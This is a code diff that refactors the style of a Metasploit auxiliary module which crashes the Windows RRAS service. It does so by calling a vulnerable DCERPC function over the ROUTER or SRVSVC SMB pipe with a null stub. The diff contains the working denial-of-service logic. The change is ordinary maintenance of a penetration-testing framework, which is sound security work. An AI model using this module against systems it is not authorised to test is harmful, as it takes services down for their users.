@@ -5,41 +5,46 @@
 
 class MetasploitModule < Msf::Auxiliary
 
-
   include Msf::Exploit::Remote::DCERPC
   include Msf::Exploit::Remote::SMB::Client
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference',
-      'Description'    => %q{
-        This module triggers a NULL dereference in svchost.exe on
-      all current versions of Windows that run the RRAS service. This
-      service is only accessible without authentication on Windows XP
-      SP1 (using the SRVSVC pipe).
-      },
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference',
+        'Description' => %q{
+          This module triggers a NULL dereference in svchost.exe on
+          all current versions of Windows that run the RRAS service. This
+          service is only accessible without authentication on Windows XP
+          SP1 (using the SRVSVC pipe).
+        },
 
-      'Author'         => [ 'hdm' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'Author' => [ 'hdm' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'OSVDB', '64340'],
 
         ],
-      'Actions'     =>
-        [
-          ['Attack', 'Description' => 'Run Denial of Service'],
+        'Actions' => [
+          ['Attack', { 'Description' => 'Run Denial of Service' }],
         ],
-      'DefaultAction' => 'Attack',
-      'DisclosureDate' => '2006-06-14'
-    ))
+        'DefaultAction' => 'Attack',
+        'DisclosureDate' => '2006-06-14',
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
-        OptString.new('SMBPIPE', [ true,  "The pipe name to use (ROUTER, SRVSVC)", 'ROUTER']),
-      ])
-
+        OptString.new('SMBPIPE', [ true, 'The pipe name to use (ROUTER, SRVSVC)', 'ROUTER']),
+      ]
+    )
   end
 
   def run
@@ -56,11 +61,12 @@ class MetasploitModule < Msf::Auxiliary
       print_status("Bound to #{handle} ...")
       stb = [0, 0, 0, 0].pack('V*')
 
-      print_status("Calling the vulnerable function...")
+      print_status('Calling the vulnerable function...')
       begin
         dcerpc.call(0x0C, stb)
-      rescue Rex::Proto::DCERPC::Exceptions::NoResponse
-      rescue => e
+      rescue Rex::Proto::DCERPC::Exceptions::NoResponse => e
+        vprint_error(e.message)
+      rescue StandardError => e
         if e.to_s !~ /STATUS_PIPE_DISCONNECTED/
           raise e
         end
